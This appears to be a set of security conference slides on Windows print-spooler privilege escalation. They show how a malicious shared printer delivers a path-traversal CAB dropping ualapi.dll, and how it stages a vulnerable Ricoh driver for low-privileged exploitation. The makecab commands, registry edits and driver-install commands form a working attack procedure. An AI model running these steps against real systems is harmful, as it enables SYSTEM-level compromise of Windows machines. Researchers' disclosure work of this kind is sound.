## Background: Previous Printer Vulnerabilities

### Ricoh Print Driver Vulnerability
- **CVE-2019-19363**
  - Full disclosure by Pentagrid
  - Metasploit module by Shelby Pace
  - Privilege escalation to SYSTEM via %PROGRAMDATA% DLL overwrite during printer installation.
  - The driver must be installed on the system.

### PrintDemon
- **CVE-2020-1048**
  - Technical write-up by Yarden Shafir and Alex Ionescu
  - Metasploit module by Brendan Watters
  - Arbitrary file write as SYSTEM by printing to a printer with an attacker-controlled file port.

### PrintDemon Patch Bypass
- **CVE-2020-1337**
  - Technical write-up by Voidsec
  - Metasploit module by Brendan Watters
  - Bypasses the patch by altering the file port to use a junction after permissions have been checked.
  - [AttackerKB Reference](https://attackerkb.com/topics/mEEwlfrTK3/cve-2020-1337)

### Evil Printer
- **CVE-2020-1300**
  - Presented at DEF CON 28 by Zhipheng Huo and Chuanda Ding.
  - Technical write-up of CAB parsing by ZDI (no PoC).
  - Local privilege escalation.
  - Path traversal in CAB file, delivered by a remote printer or local admin.

## Executing Evil Printer

### Attack Overview
1. Add Printer
2. Send malicious CAB file
3. Unpack CAB

### Printer Side: Creating the CAB
```bash
echo “ualapi.dll” “../../ualapi.dll” > files.txt
makecab /f files.txt
move disk1/1.cab exploit.cab
```
- **Reference**: [CVE-2019-13382](https://enigma0x3.net/2019/07/24/cve-2019-13382-privilege-escalation-in-snagit/)

### Printer Side: DLL Source
- [GitHub Repository](https://github.com/jacob-baines/concealed_position/blob/main/src/cp_payload/dllmain.cpp)

### Printer Side: Becoming a Printer
1. Install CutePDF Writer
2. Set the CutePDF Writer as a shared printer
3. Turn off password-protected sharing (Advanced Sharing)
4. Turn on printer sharing (Advanced Sharing)
5. Modify the following registry values:
   - `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Print\Environments\Windows\x64\Drivers\Version3\CutePDF Writer v4.0`
     - `PrinterDriverAttributes = 1`
     - `InfPath = C:\exploit\exploit.inf`
6. Create an empty file at `C:\exploit\exploit.inf`
7. Copy `exploit.cab` to `C:\Windows\System32\spool\drivers\x64\PCC\`
8. Reboot

### Client Side
- File dropped and exploited

## Installing a Print Driver

### Revisiting Ricoh
- **CVE-2019-19363**
  - Race condition when `AddPrinter` is called.
  - DLLs are dropped into a directory in ProgramData.
  - A low-privileged user can overwrite the DLL.
  - If timed correctly, `PrinterIsolationHost.exe` will load the attacker's DLL as SYSTEM.

### Ricoh Driver Availability
- Only useful if the driver is available on the system.

### Can It Be Installed?
- A low-privileged user cannot exploit a driver not on the system.
- Methods to install the vulnerable Ricoh print driver:
  - Ricoh installer
  - Add Printer UI
  - PowerShell
  - `printui.dll`
  - `prndrvr.vbs`
  - WinAPI

### Using the Ricoh Installer
- Not applicable for low-privileged users.

### Using the Add Printer UI
- Not applicable for low-privileged users.

### Using PowerShell
```powershell
Add-PrinterDriver -Name “PCL6 Driver for Universal Print” -InfPath “C:\Users\lowlevel\Downloads\disk1\oemsetup.inf”
```
- [Documentation](https://docs.microsoft.com/en-us/powershell/module/printmanagement/add-printerdriver?view=windowsserver2019-ps)

### Using `printui.dll`
```cmd
rundll32 printui.dll PrintUIEntry /ia /m “PCL6 Driver for Universal Print” /r “lpt1:” /f C:\Users\lowlevel\Downloads\disk1\oemsetup.inf
```

### Using `prndrvr.vbs`
```cmd
cscript.exe C:\Windows\System32\Printing_Admin_Scripts\en-US\prndrvr.vbs -a -m “PCL6 Driver for Universal Print” -v 3 -e “Windows x64” -i C:\Users\lowlevel\Downloads\disk1\oemsetup.inf
```

### Using the WinAPI
- [Documentation](https://docs.microsoft.com/en-us/windows/win32/printdocs/installprinterdriverfrompackage)

### As a Low-Level User
- How do we get a print driver into the driver store?

---

## Staging a Print Driver

### What Is the Driver Store?
- From Microsoft’s documentation:
  - Starting with Windows Vista, the driver store is a trusted collection of inbox and third-party driver packages.
  - The operating system maintains this collection in a secure location on the local hard disk.
  - Before a driver package is copied to the driver store, the operating system verifies the digital signature.
  - The trusted location is `C:\Windows\System32\DriverStore`.
  - Copying a driver into the Driver Store is called staging.

### Who Can Stage Drivers?
- Administrators
- `pnputil.exe` is often the tool of choice.

### Standard User Can Now Use the Driver
```powershell
Add-Printer -Name “lol” -DriverName “PCL6 Driver For Universal Print” -PortName “lpt1:”
```

### Can Someone Else Stage Drivers?
- From Microsoft’s Point and Print with Driver Packages documentation:
  - A print client that is connected to a print server can use point and print to copy an entire driver package for installation.
  - Driver signing and driver integrity are checked on the print client.
  - Driver package installation requires a driver store, which is not available on versions of Windows earlier than Windows Vista.

### An Evil Printer Can Stage a Print Driver
1. `GetPrinterDriver`
2. Send a packaged driver (CAB)
3. Add to Driver Store

### POC || GTFO
- An evil printer can stage a print driver!
  1. `GetPrinterDriver`
  2. Send a packaged driver (CAB)
  3. Add to Driver Store

### Creating a Ricoh CAB
```cmd
dir /s /b /a-d > ../files.txt
makecab /D MaxDiskSize=268435456 /d “CabinetName1=oemsetup.cab” /f ../files.txt
```

### Ricoh CAB Integrity
- Ensure the CAB file is properly signed and verified.

### Configure Evil Printer with the Ricoh CAB
- Exactly like the CVE-2020-1300 attack.
- To configure the evil printer, refer back to earlier slides or use the provided tool.

### Using Evil Printer to Stage
- Follow the steps to stage the Ricoh driver.

### Ricoh Driver Is Staged
- The driver is now in the driver store and ready for exploitation.
